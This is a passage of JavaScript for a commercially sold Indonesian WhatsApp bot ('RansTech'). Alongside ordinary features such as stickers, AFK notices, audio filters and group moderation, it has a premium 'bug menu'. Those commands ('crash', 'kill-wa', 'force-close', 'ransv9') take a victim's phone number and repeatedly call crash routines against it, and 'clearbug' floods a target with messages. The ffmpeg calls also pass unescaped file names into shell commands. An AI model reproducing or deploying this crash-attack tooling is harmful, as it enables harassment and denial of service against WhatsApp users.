            const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
            buffer = Buffer.from(response.data, "binary");
        }
        
        const webpBuffer = await sharp(buffer)
            .resize(512, 512, { fit: 'contain', background: { r: 255, g: 255, b: 255, alpha: 0 } })
            .webp({ quality: 70 })
            .toBuffer();
        
        const penis = await addExif(webpBuffer, global.packname, global.author)

        const fileName = getRandomFile(".webp");
        fs.writeFileSync(fileName, webpBuffer);

        await conn.sendMessage(m.chat, {
            sticker: penis,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: `RansTech Handsome`,
                    body: `what's special about me?`,
                    mediaType: 3,
                    renderLargerThumbnail: false,
                    thumbnailUrl: cinahitam, 
                    sourceUrl: `https://rans.tech`
                }
            }
        }, { quoted: m });

        fs.unlinkSync(fileName);
    } catch (error) {
        console.error("Error creating sticker:", error);
        reply('Terjadi kesalahan saat membuat stiker. Coba lagi nanti.');
    }
}
      
 if (m.isGroup && !m.key.fromMe) {
  let mentionUser = [
    ...new Set([
      ...(m.mentionedJid || []),
      ...(m.quoted ? [m.quoted.sender] : []),
    ]),
  ];

 for (let ment of mentionUser) {
    if (afk.checkAfkUser(ment, _afk)) {
      let getId2 = afk.getAfkId(ment, _afk);
      let getReason2 = afk.getAfkReason(getId2, _afk);
      let getTimee = Date.now() - afk.getAfkTime(getId2, _afk);
      let heheh2 = ms(getTimee);
      reply(`Jangan tag, dia sedang afk\n\n*Reason :* ${getReason2}\n*Sejak :* ${heheh2.hours} jam, ${heheh2.minutes} menit, ${heheh2.seconds} detik yg lalu\n`);
    }
  }

 if (afk.checkAfkUser(m.sender, _afk)) {
    let getId = afk.getAfkId(m.sender, _afk);
    let getReason = afk.getAfkReason(getId, _afk);
    let getTime = Date.now() - afk.getAfkTime(getId, _afk);
    let heheh = ms(getTime);

    _afk.splice(afk.getAfkPosition(m.sender, _afk), 1);
    fs.writeFileSync("./start/lib/database/afk.json", JSON.stringify(_afk));
      reply(`@${m.sender.split("@")[0]} telah kembali dari afk\n\n*Reason :* ${getReason}\n*Selama :* ${heheh.hours} jam ${heheh.minutes} menit ${heheh.seconds} detik\n`);
  }
 }
  
 if (chats.antilink) {
     if (budy.includes('chat.whatsapp.com')) {
         if (isAdmins || Access) return;
         reply(`> GROUP LINK DETECTOR\n\nsepertinya kamu mengirimkan link grup, maaf, pesan tersebut saya hapus`);
         if (!isBotAdmins) return reply(`bot bukan admin`);
         let gclink = `https://chat.whatsapp.com/${await conn.groupInviteCode(m.chat)}`;
         if (budy.includes(gclink)) return;
         await conn.sendMessage(m.chat, {
             delete: m.key
         });	
     }  
 }

async function fetchBuffer (url, options) {
  try {
    options ? options : {};
    const res = await axios({
      method: "GET",
      url,
      headers: {
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36",
        DNT: 1,
        "Upgrade-Insecure-Request": 1,
      },
      ...options,
      responseType: "arraybuffer",
    });
    return res.data;
  } catch (err) {
    return err;
  }
};

conn.autoshalat = conn.autoshalat ? conn.autoshalat : {};
        let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? conn.user.id : m.sender;
        let id = m.chat;
        if (id in conn.autoshalat) {
            return false;
        }
        let jadwalSholat = {
            shubuh: "04:27",
            terbit: "05:52",
            dzuhur: "12:05",
            ashar: "15:32",
            magrib: "18:17",
            isya: "19:33",
        };

        const datek = new Date(
            new Date().toLocaleString("en-US", {
                timeZone: "Asia/Makassar",
            }),
        );
        const hours = datek.getHours();
        const minutes = datek.getMinutes();
        const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`;
        for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
            if (timeNow === waktu) {
                let caption = `hai kak ${pushname}
waktu *${sholat}* telah tiba, ambilah air wudhu dan segeralah shalat ya,

*${waktu}*
_untuk wilayah Makassar dan sekitarnya._`;
                conn.autoshalat[id] = [
                    conn.sendMessage(m.chat, { 
                        text: caption,
                        footer: "© RansTech - 2025",
                        buttons: [
                            {
                                buttonId: ".bike", 
                                buttonText: { 
                                    displayText: 'baik' 
                                }, type: 1 }
                        ],
                        viewOnce: true,
                        headerType: 1
                    }, { quoted: m }),
                    setTimeout(async () => {
                        delete conn.autoshalat[m.chat];
                    }, 57000),
                ];
            }
        }
  
/** plugins **/
const pluginsLoader = async (directory) => {
    let plugins = [];
    const folders = fs.readdirSync(directory);
    folders.forEach(file => {
        const filePath = path.join(directory, file);
        if (filePath.endsWith(".js")) {
            try {
                const resolvedPath = require.resolve(filePath);
                if (require.cache[resolvedPath]) {
                    delete require.cache[resolvedPath];
                }
                const plugin = require(filePath);
                plugins.push(plugin);
            } catch (error) {
                console.log(`${filePath}:`, error);
            }
        }
    });
    return plugins;
};

const pluginsDisable = true;
const plugins = await pluginsLoader(path.resolve(__dirname, "../plugins"));
const plug = { 
    conn,
    Access,
    command,
    isCmd,
    reply,
    text,
    chats,
    users,
    args,
    botNumber,
    reaction,
    makeStickerFromUrl,
    pushname,
    isBan,
    isPremium,
    isGroup: m.isGroup,
    isPrivate: !m.isGroup
};

for (let plugin of plugins) {
    if (plugin.command.find(e => e == command.toLowerCase())) {
        if (plugin.owner && !Access) {
            return reply(mess.owner);
        }
        if (plugin.premium && !isPremium) {
            return reply(ness.premium);
        }
        if (plugin.group && !plug.isGroup) {
            return reply(mess.group);
        }
        if (plugin.private && !plug.isPrivate) {
            return reply(mess.private);
        }
        if (typeof plugin !== "function") return;
        await plugin(m, plug);
    }
}

if (!pluginsDisable) return;
/** end plugins **/    
        
switch (command) {
    case 'addacc': {
        if (!Access) return reply(mess.owner);
        if (!text) return reply(`where is the user number and IP? example ${prefix + command} <number>|<user IP>`);
        const [nomorUser, ipUser] = text.split('|');
        if (!nomorUser || !ipUser) return reply(`where is the number and IP? example ${prefix + command} <number>|<user IP>`);
        addUser(nomorUser, ipUser);
        await reaction(m.chat, "⛈️")
        await sleep(60000)
        conn.sendMessage(m.chat, {
            text: `successfully added ${nomorUser} and ${ipUser} to whitelist` },
        { quoted:m })
    }
    break;
        
    case 'dellacc': {
        if (!Access) return reply(mess.owner);
        if (!text) return reply(`where is the user number and IP? example ${prefix + command} <number>|<user IP>`);
        const [nomorUser, ipUser] = text.split('|');
        if (!nomorUser || !ipUser) return reply(`where is the number and IP? example ${prefix + command} <number>|<user IP>`);
        removeUser(nomorUser, ipUser);
        await reaction(m.chat, "⛈️")
        await sleep(60000)
        conn.sendMessage(m.chat, {
            text: `successfully removed ${nomorUser} and ${ipUser} to whitelist` },
        { quoted:m })
    }
    break;
        
    case 'listacc': {
        if (!Access) return reply(mess.owner);
        getUserList().then(result => {
            if (result) {
                reply(result);
            } else {
                reply('not found.');
            }
        });
    }
    break;

    case 'checkacc': {
        if (!text || !text.includes('|')) {
        reply(`please enter your number and IP, example ${prefix + command} <number>|<user IP>`);
        } else {
            const [nomor, ip] = text.split('|');
            checkUser(nomor.trim(), ip.trim()).then(result => {
                reply(result);
        });
    }
    }
    break;
    
    case 'bike':{
        reaction(m.chat, '❤️')
    }
    break

case 'clearbug': {
if (!isPremium) return reply('Lu Gak Punya Access Tolol...')
await reaction(m.chat, "⚡")
if (!q) return reply(`Your Used ${prefix + command} 31xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return reply(`Contoh Nih Njing : ${prefix + command} 31xxx`)
let target = pepec + '@s.whatsapp.net'
for (let i = 0; i < 3; i++) {
await conn.sendMessage(target, {text: "ℝℕℂℍ ℂℝ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\ndone clear bug by ranstech",
});
}
reply("Done clear bug");
}
break
        
    case 'buyscrans':{
    await reaction(m.chat, "⚡")
       officialist = `6285773466382@s.whatsapp.net`
        let anj = `*Sc ini di jual dengan harga*
~100k~ 55k
scan qris di atas, dan jika sudah tf silahkan send bukti ke nomor yang ada di bawah
pm
https://t.me/ranstamvan1
https://wa.me/6283159682165`;
        conn.sendMessage(from, { image: thumb, caption: anj, mentions:[sender, officialist] }, { quoted: m })
        }
    break;
        
case 'menu': {
if (isBan) return
    let limitnya = users.limit
    await reaction(m.chat, "⚡")
    let anj = `Hi ${pushname} Saya Adalah Bot Whatsapp Yang Dirancang Untuk Membantu Anda, Saya Di Ciptakan Oleh Ranstech dev

┏━━━━━━━━━━━━━━
┃ 
┃Name Bot : rans v9
┃Developer : ranstech
┃Version sc : 10
┃
┃
┃ 
┃✇ ransv10
┃
┃ 
┃✇ ${prefix}public
┃✇ ${prefix}self
┃✇ ${prefix}addowner 
┃✇ ${prefix}dellowner
┃✇ ${prefix}addprem 
┃✇ ${prefix}delprem
┃
┃ 
┃✇ ${prefix}stext
┃✇ ${prefix}brat
┃✇ ${prefix}qc 
┃✇ ${prefix}sticker/s
┃✇ ${prefix}play 
┃✇ ${prefix}ig
┃✇ ${prefix}upch 
┖━━━━━━━━━━━━━━━━━━━━━━

`;    
const buttons = [
  {
    buttonId: `.buyscrans`, 
    buttonText: { 
      displayText: 'buynoenc' 
    }
  }, {
    buttonId: ".tqto", 
    buttonText: {
      displayText: " "
    }
  }
]

const buttonMessage = {
    document: { url: "https://wa.me/6283159682165" },
    mimetype: "image/png",
    fileName: "RansTech - 2025",
    fileLength: 999999999999999,
    pageCount: 99999,
    jpegThumbnail: (await resize (fs.readFileSync('./start/lib/media/tes.png'), 400, 400)),
    caption: anj,
    footer: 'かた - RansTech',
    mentions: await conn.ments('Aʟʟ Mᴇɴᴜ'),
    buttons: buttons,
    headerType: 1,
    contextInfo: { 
      forwardingScore: 99999, 
      externalAdReply: { 
        body: `hi ${pushname}`, 
        containsAutoReply: true, 
        mediaType: 1, 
        mediaUrl: "peler",  
        renderLargerThumbnail: true, 
        showAdAttribution: true, 
        sourceId: 'Tes', 
        sourceType: 'PDF', 
        previewType: 'PDF', 
        sourceUrl: "https://wa.me/6283159682165", 
        thumbnail: fs.readFileSync('./start/lib/media/tes.png'),
          thumbnailUrl: "https://files.catbox.moe/ezcbqe.jpg",         title: 'rans anti jomok bro',
      },
    },
    viewOnce: true,
    headerType: 6
  };

  const flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'Aksi dengan flow' },
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "Button Menu",
                    sections: [
                        {
                            title: "RΛ͛Ν͢Ѕ ͛͢- T͞ΞϾ͢H",
                            highlight_label: "public", 
                            rows: [
                                {
                                    header: "public rans",
                                    title:"publicmode ",
                                    description: "whatsapp i love you",
                                    
 id: ".public"
                                },
                                {
                                    header: "mode seleb",
                                    title: "self",
                                    description: "Mode Bot Seleb Di Aktifkan",
                                    id: ".self"
                                }, 
                                {
                                   header: "bugmenu",
                                    title: "bugmenu",
                                    description: "Bug Menu? Gacor Kang",
                                    id: ".bugmenu"
                                }
                            ]   
                        }
                    ]
                })
            },
            viewOnce: true
        }
    ];

    buttonMessage.buttons.push(...flowActions);

return await conn.sendMessage(m.chat, buttonMessage, { quoted: m });
  };
  break;
        
  case 'bugmenu': {
if (isBan) return
    let limitnya = users.limit
    await reaction(m.chat, "⚡")
    officialist = `6285773466382@s.whatsapp.net`
    let anj = ` hi ${pushname} berikut adalah tampilan bug menu v10
┏━━━━━━━━━━━━━━
┃ 
┃Name Bot : rans v10
┃Developer : ranstech
┃Version sc : 10
┃
┃*- ransv10 <number>*
┃
┗━━━━━━━━━━━━━━

t.me/ranstamvan1
`
conn.sendMessage(from, { image: rans6, caption: anj, mentions:[sender, officialist] }, { quoted: m })

  }

  break;

case "rans-beta": case "xrans": case "crash":
        if (!isPremium) return reply(" khusus premium ")
        if (!q) {
          return m.reply(`Commandnya Salah tolol Harusnya gini
Contoh: ${prefix+command} 628×××`);
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await reaction(m.chat, "⚡")
       let ransBug = `_*</>succes send bug command to ${target}*_ 
*type bug : crash new*`
conn.sendMessage(m.chat, {
	image: rans6,
  caption: ransBug,
  footer: "RansTamvan what's special about me?",
    contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 9999999,
        isForwarded: true,
        "externalAdReply": {
            "showAdAttribution": true,
            "containsAutoReply": true,
            "title": `ranstech v9`,
            "body": `© rand anti petinggi`,
            "previewType": "PHOTO",
            "thumbnailUrl": `youtube.com/@zahranDev`,
            "thumbnail": fs.readFileSync('./rans.jpg'),
            "sourceUrl": `https://whatsapp.com/channel/0029Vb270iZFHWpthaGyMH0q`
        }
    },
buttons: [
{
    buttonId: ".buyscrans", 
    buttonText: {
      displayText: "Buy Script"
    }
  }
],
viewOnce: true,
  headerType: 6,
}, { quoted: m });
        await funcnew(target)
        await funcFc(target)
        await funcnew(target)
        await funcFc(target)
 break;
case "crash-ui": case "kill-wa":
        if (!isPremium) return reply(" khusus premium ")
        if (!q) {
          return m.reply(`\`Example:\` : ${prefix+command} 628×××`);
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await reaction(m.chat, "⚡")
        let ransBug1 = `_*</>succes send bug to ${target}*_ 
*type bug : crash ui*`
conn.sendMessage(m.chat, {
	image: rans6,
  caption: ransBug1,
  footer: "RansTamvan what's special about me?",
    contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 9999999,
        isForwarded: true,
        "externalAdReply": {
            "showAdAttribution": true,
            "containsAutoReply": true,
            "title": `ranstech v9`,
            "body": `© rand anti petinggi`,
            "previewType": "PHOTO",
            "thumbnailUrl": `youtube.com/@zahranDev`,
            "thumbnail": fs.readFileSync('./rans.jpg'),
            "sourceUrl": `https://whatsapp.com/channel/0029Vb270iZFHWpthaGyMH0q`
        }
    },
buttons: [
{
    buttonId: ".buyscrans", 
    buttonText: {
      displayText: "Buy Script"
    }
  }
],
viewOnce: true,
  headerType: 6,
}, { quoted: m });
        for (let r = 0; r < 4; r++) {
        await fcbeta(target)
        await fcbeta(target)
        }
 break;
case "force-close": case "notrespon":
        if (!isPremium) return reply(" khusus premium ")
        if (!q) {
          return m.reply(`Commandnya Salah tolol Harusnya gini
Contoh: ${prefix+command} 628×××`);
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await reaction(m.chat, "⚡")
        let ransBug2 = `_*</>succes send bug to ${target}*_ 
*type bug : crash gacor☠️*`
conn.sendMessage(m.chat, {
	image: rans6,
  caption: ransBug2,
  footer: "RansTamvan what's special about me?",
    contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 9999999,
        isForwarded: true,
        "externalAdReply": {
            "showAdAttribution": true,
            "containsAutoReply": true,
            "title": `ranstech v9`,
            "body": `© rand anti petinggi`,
            "previewType": "PHOTO",
            "thumbnailUrl": `youtube.com/@zahranDev`,
            "thumbnail": fs.readFileSync('./rans.jpg'),
            "sourceUrl": `https://whatsapp.com/channel/0029Vb270iZFHWpthaGyMH0q`
        }
    },
buttons: [
{
    buttonId: ".buyscrans", 
    buttonText: {
      displayText: "Buy Script"
    }
  }
],
viewOnce: true,
  headerType: 6,
}, { quoted: m });
        for (let r = 0; r < 2; r++) {
        await funcnew(target)
        await funcFc(target)
        }
 break;
 case "ransv9":
        if (!isPremium) return reply(" khusus premium ")
        if (!q) {
          return m.reply(`Commandnya Salah tolol Harusnya gini
Contoh: ${prefix+command} 628×××`);
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        await reaction(m.chat, "⚡")
        let ransBug3 = `_*</>succes send bug to ${target}*_ 
*type bug : crash biasa*`
conn.sendMessage(m.chat, {
	image: rans6,
  caption: ransBug3,
  footer: "RansTamvan what's special about me? ",
    contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 9999999,
        isForwarded: true,
        "externalAdReply": {
            "showAdAttribution": true,
            "containsAutoReply": true,
            "title": `ranstech v9`,
            "body": `© rand anti petinggi`,
            "previewType": "PHOTO",
            "thumbnailUrl": `youtube.com/@zahranDev`,
            "thumbnail": fs.readFileSync('./rans.jpg'),
            "sourceUrl": `https://whatsapp.com/channel/0029Vb270iZFHWpthaGyMH0q`
        }
    },
buttons: [
{
    buttonId: ".buyscrans", 
    buttonText: {
      displayText: "Buy Script"
    }
  }
],
viewOnce: true,
  headerType: 6,
}, { quoted: m });
        for (let r = 0; r < 3; r++) {
        await funcnew(target)
        }
 break;
 
case 'ransv10': {
if (isBan) return reply(`\`[ ! ]\` *You Have Been Banned*`)
    if (!isPremium) return reply(" Khusus Premium")
    if (!text) return m.reply(" : .ransv10 <number> ");
    const targetId = text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    let LinkBokep = 'https://files.catbox.moe/ezcbqe.jpg'; // Ganti dengan URL gambar yang valid

    conn.sendMessage(m.chat, {
        image: { url: LinkBokep },
        caption: `\`⿻᪶ࣼ͜͜͠͡͡͠ ̶᪶᪶᪶᪳᪳᪳ᷤ᪳᪳᪳͢⿻\`\nTarget Bug: @${targetId.split('@')[0]}`,
                            contextInfo: {
      forwardingScore: 3,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363330344810280@newsletter",
                serverMessageId: null,
                  newsletterName: `⃟༑⿻᪶ࣼ͜͜͠͡͡͠ ̶᪶᪶᪶᪳᪳᪳ᷤ᪳᪳᪳͢⿻⃟`
            },
                        mentionedJid: [m.sender],
                    },
        footer: "© Ranstech",
        buttons: [
            { buttonId: `.ransv9 ${targetId}`, buttonText: { displayText: "CRASH BIASA" }, type: 1 },
            { buttonId: `.notrespon ${targetId}`, buttonText: { displayText: "̷̕CRASH GACOR" }, type: 1 },
            { buttonId: `.ransv9 ${targetId}`, buttonText: { displayText: "UI SYSTEM̍̅̀̎" }, type: 1 },
            { buttonId: `.ransv9 ${targetId}`, buttonText: { displayText: "" }, type: 1 },
            { buttonId: `.ransv9 ${targetId}`, buttonText: { displayText: "NEW BUG" }, type: 1 }
        ],
        headerType: 2,
        viewOnce: true
    }, { quoted: glxNull });
}
break;
//BATAS MENU BUG
case'stext':{
    if (isBan) return
    if (!text) return reply(`mau nulis apa ajg? contoh ${prefix + command} woi hitam`)
    await reaction(m.chat, "⚡")
    let json = {
        type: 'stories',
        format: 'png',
        backgroundColor: '#1b1e23',
        width: 512,
        height: 720,
        scale: 4,
        watermark: 'Laurine',
        messages: [{
            entities: 'auto',
            avatar: true,
            from: {
                id: 18,
                name: await conn.getName(m.sender),
                photo: {
                    url: await conn.profilePictureUrl(m.sender, 'image').catch(_ => "https://telegra.ph/file/320b066dc81928b782c7b.png")
                }
            },
            text: text 
        }, 
    ]};
    const { data } = await axios.post('https://dikaardnt.com/api/maker/quote', json);
    var media = Buffer.from(data.image, 'base64')
    var res = await uploadImage(media)
    conn.sendMessage(m.chat, {
        image: { url : res },
        caption: '' },{ quoted: m })
}
break
           
case "afk":{
    if (isBan) return
    if (!m.isGroup) return reply(mess.group);
    if (isAfkOn) return reply("lu kan lagi afk bjirr")
    let reason = text ? text : "gada bjirr";
    afk.addAfkUser(m.sender, Date.now(), reason, _afk);
    reply(`@${m.sender.split("@")[0]} AFK\nAlasan: ${reason}`);
}
break;
            
case 'tovocal':
  case 'getvocal':
    case 'vocal':{
        if (isBan) return
        if (!text) return reply(`lagu yang mau di ambil vocalnya? contoh : ${prefix + command} it will rain`)
        let search = await yts(text);
        await reaction(m.chat, "⚡")
        let telaso = search.all[0].url;
        let puqi = await VocalRemover(telaso);
          let vocalAudio = puqi.stuffs.find(item => item.bizType === 'vocal').key;
          conn.sendMessage(m.chat, {
              audio: { url : vocalAudio },
              mimetype: 'audio/mpeg', 
              ptt: true
          },{quoted:m})
        }
      break;
            
case 'remini':
  case 'hd':
    case 'hdr': {
        if (isBan) return
        if (!quoted || !/image/.test(mime)) return reply(`mana imagenya? reply image dengan caption ${prefix + command}`)          
        const peler = await quoted.download()              
        let getResult;             
        const ImgLarger = require("./lib/scrape/remini")    
        await reaction(m.chat, "⚡")
        const imgLarger = new ImgLarger();
        try {    
            const Logger = await imgLarger.processImage(peler, 4);
            getResult = Logger.data.downloadUrls[0];
            await conn.sendMessage(m.chat, {      
                image: { url: `${getResult}` }, 
                caption: `> * fetching - unlimited*

status: succes
creator: rasilius`
            },{ quoted: m });
        } catch (error) { 
            console.error('Proses gagal total:', error.message);        
        }
    }
    break;
        
case 'jodoh': {
    if (!m.isGroup) return reply(mess.group)
    let member = participants.map(u => u.id)
    let orang = member[Math.floor(Math.random() * member.length)]
    let jodoh = member[Math.floor(Math.random() * member.length)]
    reply(`@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`)
}
break
                
case 'banchat':{
    if (isBan) return
    if (!Access) return reply(mess.owner)
    if (global.db.data.chats[m.chat].isBanned = true) return reply("Sudah Active")
    global.db.data.chats[m.chat].isBanned = true
    reply("berhasil banchat")
}
break

case 'unbanchat':{
    if (isBan) return
    if (!Access) return reply(mess.owner)
    if (global.db.data.chats[m.chat].isBanned = false) return reply("Sudah Off")
    global.db.data.chats[m.chat].isBanned = false
    reply("berhasil unbanchat")
}
break
        
case 'bass': 
  case 'blown': 
    case 'deep': 
      case 'earrape': 
      case 'fast': 
      case 'fat': 
      case 'nightcore': 
      case 'reverse': 
      case 'robot': 
      case 'slow': 
      case 'smooth': 
      case 'tupai': {
          if (isBan) return
          if (!/audio/.test(mime)) return reply(`reply audio, dengan caption *${prefix + command}*`);
          let set;
          if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20';      
          if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log';       
          if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3';     
          if (/earrape/.test(command)) set = '-af volume=12';      
          if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"';      
          if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"';     
          if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25';        
          if (/reverse/.test(command)) set = '-filter_complex "areverse"';      
          if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"';   
          if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'; 
          if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"';    
          if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"';
          if (/audio/.test(mime)) {
              let media = await conn.downloadAndSaveMediaMessage(quoted);
              await reaction(m.chat, "⚡")
              let ran = getRandomFile('.mp3');
              exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                  fs.unlinkSync(media);
                  if (err) return reply(err);
                  let buff = fs.readFileSync(ran);        
                  sendMusic(buff);
                  fs.unlinkSync(ran);
              });
          }
      }
      break;
            
case 'toimage': 
  case 'toimg': {
      if (isBan) return
      if (!/webp/.test(mime)) return reply(`reply sticker dengan caption *${prefix + command}*`)
      let media = await conn.downloadAndSaveMediaMessage(quoted)
      await reaction(m.chat, "⚡")
      let ran = await getRandomFile('.png')  
      exec(`ffmpeg -i ${media} ${ran}`, (err) => {
          fs.unlinkSync(media)
          if (err) return err 
          let buffer = fs.readFileSync(ran)   
          conn.sendMessage(m.chat, {   
              image: buffer     
          }, { quoted: m })
          fs.unlinkSync(ran)
      }
    )
  }
  break
                
  case "pin":
  case "pinterest":{
      if (isBan) return
      if (!text) return reply(`mau nyari apa? contoh ${prefix + command} yaemiko`);
      await reaction(m.chat, "⚡")
      let anu = await pinterest(text);
      let result = anu[Math.floor(Math.random() * anu.length)];
      conn.sendButtonImg(m.chat,
        [
            {
                id: `${prefix + command} ${text}`,
                text: 'next',
                type: 1
            }
        ],"ini kak", result, "© ꓘIuuR N7 - 2025", m, {viewOnce: true })
  }
  break;
  
  case "upsaluran":
  case "upch":{
      if (isBan) return
      if (!Access) return reply(mess.owner)
      await reaction(m.chat, "⏳")
      await sleep(3000)
      await reaction(m.chat, "⌛")
      conn.sendMessage(`${global.idch}`,{ 
          audio : await quoted.download(),
          mimetype: 'audio/mp4',
          ptt: true
      })
      await sleep(2000)
      await reaction(m.chat, "✅")
  }
  break
                
  case 'h':
  case 'hidetag': {
      if (isBan) return
      if (!m.isGroup) return reply(mess.group)
      if (!isAdmins && !Access) return reply(mess.admin)
      if (m.quoted) {
          conn.sendMessage(m.chat, {
              forward: m.quoted.fakeObj,
              mentions: participants.map(a => a.id)
          })
      }
      if (!m.quoted) {
          conn.sendMessage(m.chat, {
              text: q ? q : '',
              mentions: participants.map(a => a.id)
          }, { quoted: m })
      }
  }
  break
                
  case "kick":
  case "kik":
  case "dor":{
      if (isBan) return
      if (!m?.isGroup) return reply(mess.group)
      if (!isAdmins) return reply(mess.admin)
      if (!isBotAdmins) return reply(mess.botadmin)
      if (!text && !m?.quoted) return reply(`siapa yang mau di kick njrr, contoh reply orang atau tag dengan caption ${prefix + command}`)
      let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
      await conn.groupParticipantsUpdate(m?.chat, [users], 'remove').catch(console.log)
  }
  break
                
  case 'cekkhodam': {
      if (isBan) return
      if (!text) return reply(`ketik nama lu anjg, contoh ${prefix + command} rido`)
      let who
      if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.sender;
      const anunya = [
	  "Kaleng Cat Avian",
	  "Pipa Rucika",
	  "Botol Tupperware",
	  "Badut Mixue",
	  "Sabun GIV",
	  "Sandal Swallow",
	  "Jarjit",
	  "Ijat",
	  "Fizi",
	  "Mail",
	  "Ehsan",
	  "Upin",
	  "Ipin",
	  "sungut lele",
	  "Tok Dalang",
	  "Opah",
	  "Opet",
	  "Alul",
	  "Pak Vinsen",
	  "Maman Resing",
	  "Pak RT",
	  "Admin ETI",
	  "Bung Towel",
	  "Lumpia Basah",
	  "Martabak Manis",
	  "Baso Tahu",
	  "Tahu Gejrot",
	  "Dimsum",
	  "Seblak Ceker",
	  "Telor Gulung",
	  "Tahu Aci",
	  "Tempe Mendoan",
	  "Nasi Kucing",
	  "Kue Cubit",
	  "Tahu Sumedang",
	  "Nasi Uduk",
	  "Wedang Ronde",
	  "Kerupuk Udang",
	  "Cilok",
	  "Cilung",
	  "Kue Sus",
	  "Jasuke",
	  "Seblak Makaroni",
	  "Sate Padang",
	  "Sayur Asem",
	  "Kromboloni",
	  "Marmut Pink",
	  "Belalang Mullet",
	  "Kucing Oren",
	  "Lintah Terbang",
	  "Singa Paddle Pop",
	  "Macan Cisewu",
	  "Vario Mber",
	  "Beat Mber",
	  "Supra Geter",
	  "Oli Samping",
	  "Knalpot Racing",
	  "Jus Stroberi",
	  "Jus Alpukat",
	  "Alpukat Kocok",
	  "Es Kopyor",
	  "Es Jeruk",
	  "Cappucino Cincau",
	  "Jasjus Melon",
	  "Teajus Apel",
	  "Pop ice Mangga",
	  "Teajus Gulabatu",
	  "Air Selokan",
	  "Air Kobokan",
	  "TV Tabung",
	  "Keran Air",
	  "Tutup Panci",
	  "Kotak Amal",
	  "Tutup Termos",
	  "Tutup Botol",
	  "Kresek Item",
	  "Kepala Casan",
	  "Ban Serep",
	  "Kursi Lipat",
	  "Kursi Goyang",
	  "Kulit Pisang",
	  "Warung Madura",
	  "Gorong-gorong",
]
      function getRandomKhodam() {
          const randomKhodam = Math.floor(Math.random() * anunya.length);
    return anunya[randomKhodam];
}
const khodam = getRandomKhodam()
      const response = ` 
> *Nama :* ${text}
> *Khodam :* ${khodam}`
      reply(response)
  }
  break
        
  case 'apakah': {
      if (isBan) return
      if (!q) return reply(`apa njrr? contoh ${prefix + command} saya wibu`)
      const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
      const kah = apa[Math.floor(Math.random() * apa.length)]
      reply(`pertanyaan : apakah ${q}\njawaban : ${kah}`)
  }
  break
                
  case 'bisakah': {
      if (isBan) return
      if (!q) return reply(`apaa njrr? contoh ${prefix + command} saya menjadi presiden`)
